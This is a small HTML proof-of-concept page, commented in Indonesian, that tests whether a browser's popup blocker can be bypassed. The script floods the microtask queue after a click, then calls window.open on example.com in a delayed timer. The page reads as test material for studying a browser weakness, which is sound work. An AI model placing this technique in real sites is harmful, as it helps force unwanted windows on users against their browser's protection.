<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Popup Blocker Race Condition PoC</title>
</head>
<body>
    <h2>Simulasi Popup Blocker Bypass via Async Race Condition</h2>
    <p>Klik tombol di bawah untuk memicu interaksi awal, lalu uji apakah celah timing berhasil membuka jendela baru.</p>
    
    <!-- Tombol untuk memberikan initial user gesture -->
    <button id="triggerBtn">Mulai Tes Popup</button>

    <script>
        document.getElementById('triggerBtn').addEventListener('click', function() {
            console.log("Interaksi pengguna (gesture) terdeteksi. Memulai race condition...");

            // 1. Memanfaatkan aktivasi transien awal untuk menyiapkan referensi jendela
            // Terkadang membuka jendela kosong langsung di dalam event handler sah,
            // atau menunda eksekusi payload melalui microtask/macrotask flooding.
            
            let attemptOpen = () => {
                try {
                    // Mencoba membuka pop-up di tengah antrean asinkron yang padat
                    let win = window.open('https://example.com', '_blank');
                    if (win) {
                        console.log("POPUP BERHASIL DIBUKA (Bypass terdeteksi)!");
                    } else {
                        console.log("Diblokir oleh pop-up blocker browser.");
                    }
                } catch (e) {
                    console.error("Error:", e);
                }
            };

            // 2. Membanjiri microtask queue untuk menciptakan celah timing pada event loop
            for (let i = 0; i < 50; i++) {
                Promise.resolve().then(() => {
                    // Operasi kecil untuk menahan thread
                    let dummy = Math.sqrt(i) * Math.random();
                });
            }

            // 3. Menjadwalkan pemanggilan window.open tepat di luar siklus sinkron murni
            // untuk menguji apakah status aktivasi transien masih "bocor" atau salah dihitung.
            setTimeout(attemptOpen, 10);
        });
    </script>
</body>
</html>
